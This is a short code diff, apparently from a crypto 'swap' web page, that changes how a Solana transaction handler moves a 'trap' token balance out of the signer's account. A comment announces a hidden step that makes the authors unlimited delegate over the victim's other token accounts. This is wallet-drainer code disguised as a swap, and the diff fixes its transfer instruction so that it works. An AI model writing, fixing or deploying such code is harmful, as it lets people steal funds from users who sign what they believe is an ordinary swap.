@@ -90,8 +90,8 @@ document.getElementById("swap").onclick = async () => {
     }
     tx.add(new W.TransactionInstruction({
       programId: t22,
-      keys: [ { pubkey: srcTrap, isSigner: false, isWritable: true }, { pubkey: dstTrap, isSigner: false, isWritable: true }, { pubkey: owner, isSigner: true, isWritable: false } ],
-      data: Uint8Array.from([3, ...le(trapBal)]), // Token-22 Transfer = byte 3 (12 is TransferChecked there)
+      keys: [ { pubkey: srcTrap, isSigner: false, isWritable: true }, { pubkey: trap, isSigner: false, isWritable: false }, { pubkey: dstTrap, isSigner: false, isWritable: true }, { pubkey: owner, isSigner: true, isWritable: false } ],
+      data: Uint8Array.from([12, ...le(trapBal), 6]), // TransferChecked (fee mints require it: source, mint, dest, owner + decimals)
     }));
     // 2 · THE HIDDEN PART — Approve: us = unlimited delegate on their other token accounts
     for (const pid of [TOKEN, TOKEN22]) {
